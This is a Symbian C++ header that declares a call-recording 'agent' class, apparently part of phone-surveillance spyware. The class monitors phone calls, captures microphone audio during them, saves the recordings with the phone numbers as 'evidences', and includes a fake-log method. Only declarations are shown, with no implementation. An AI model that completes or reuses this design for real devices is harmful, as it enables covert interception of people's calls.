/*
 * AgentCall.h
 *
 *  Created on: 17/mag/2011
 *      Author: Giovanna
 */

#ifndef AGENTCALLLOCAL_H_
#define AGENTCALLLOCAL_H_

#include "AbstractAgent.h"
#include "AdditionalDataStructs.h"
#include "MonitorPhoneCall.h"
#include <MdaAudioInputStream.h>
#include <mda\common\audio.h>
#include <mmf\common\mmfutilities.h>
#include <HT\TimeOutTimer.h>

enum TRecordingState
	{
	ENotReady,
	EReady
	};

// CLASS DECLARATION

/**
 *  CAgentCallLocal
 * 
 */
class CAgentCallLocal : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MCallMonCallBack, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentCallLocal();

	/**
	 * Two-phased constructor.
	 */
	static CAgentCallLocal* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentCallLocal* NewLC(const TDesC8& params);
	
	
protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
	virtual void NotifyAgentCmdL(TUint32 aData);
		
private:
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentCallLocal();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	void WriteFakeLog();
	
	// From MCallMonCallBack
	virtual void NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber);
	virtual void NotifyDisconnectedCallStatusL();
	virtual void NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber);

	// From MTimeOutNotifier
	virtual void TimerExpiredL(TAny* src);
	    
	/*
	 * MaiscOpenComplete()
	 *
	 * A callback function that is called when 
	 * CMdaAudioInputStream::Open() has completed, indicating that the audio 
	 * input stream is ready for use.
	 */
	virtual void MaiscOpenComplete(TInt aError);

	/*
	 * MaiscBufferCopied()
	 *
	 * A callback function that is called when a chunk of audio data 
	 * has been copied to the descriptor specified in a 
	 * CMdaAudioInputStream::ReadL().
	 */
	virtual void MaiscBufferCopied(TInt aError, const TDesC8& aBuffer);
	
	/*
	 * MaiscRecordComplete()
	 *
	 * A callback function that is called when the input stream is
	 * closed using CMdaAudioInputStream::Stop(). 
	 *
	 */ 
	virtual void MaiscRecordComplete(TInt aError);
		
private: 
	// data members
	// agent parameters:
	TUint32 iBuffSize;  // capture buffer length in bytes
	TUint32 iCompression;  //not used
	
	// audio rec: 
	// audio input stream object reference
	CMdaAudioInputStream* iInputStream;
	// The default encoding used 
	TFourCC iDefaultEncoding;
	// Audio data stream settings for input stream
	TMdaAudioDataSettings iStreamSettings;
	// Buffers used during recording
	RPointerArray<TDes8>	iStreamBufferArray;
	TInt iStreamIdx;
	// Data to be written into log file
	HBufC8* iRecData;
	// Frames counter
	//TInt iFramesCounter;
	// recording state
	TRecordingState iRecState;
	
	// evidences:
	TVoiceAdditionalData iVoiceAdditionalData;  
	
	// monitor drive space:
	TBool  iBelowFreespaceQuota;
	
	// monitor call:
	CPhoneCallMonitor*	iCallMonitor;
	TBool 				iInCall;
	TBuf8<16>			iTelNum;
	
	// timeout timer for beep:
	CTimeOutTimer* 	iTimer;
	};

#endif /* AGENTCALLLOCAL_H_ */
